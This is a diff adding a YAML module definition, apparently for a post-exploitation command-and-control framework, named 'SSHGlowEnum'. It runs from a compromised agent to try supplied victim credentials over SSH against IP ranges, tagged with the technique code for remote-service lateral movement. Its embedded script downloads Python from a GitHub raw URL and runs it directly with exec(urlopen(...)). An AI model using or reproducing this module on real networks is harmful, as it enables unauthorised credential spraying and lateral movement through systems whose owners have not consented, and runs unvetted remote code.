@@ -1,0 +1,40 @@
+name: SSHGlowEnum
+authors:
+  - '@abdallah_elsharif'
+description: This module will find our access in network.
+software: ''
+techniques:
+  - T1021
+background: true
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: python
+min_language_version: '2.6'
+comments:
+  - https://github.com/abdallah-elsharif/sshglow
+options:
+  - name: Agent
+    description: Agent to use ssh from.
+    required: true
+    value: ''
+  - name: Targets
+    description: target to scan in single or Range ex(192.168.1.1-10) or CIDR format
+    required: true
+    value: ''
+  - name: Creds
+    description: (Victim)File or user1:pass1,user2:pass2 or only one
+    required: true
+    value: ''
+  - name: Delay
+    description: Delay interval in seconds
+    required: true
+    value: '5'
+script: |
+  import urllib
+  from urllib.request import urlopen
+  try:
+      exec(urlopen("https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py").read().decode("utf-8"))
+      run("{{ Targets }}","{{ Creds }}",delay={{ Delay }})
+  except urllib.error.URLError:
+      print("\033[0;31m[!]\033[0;37m We need internet access to load sshglow")
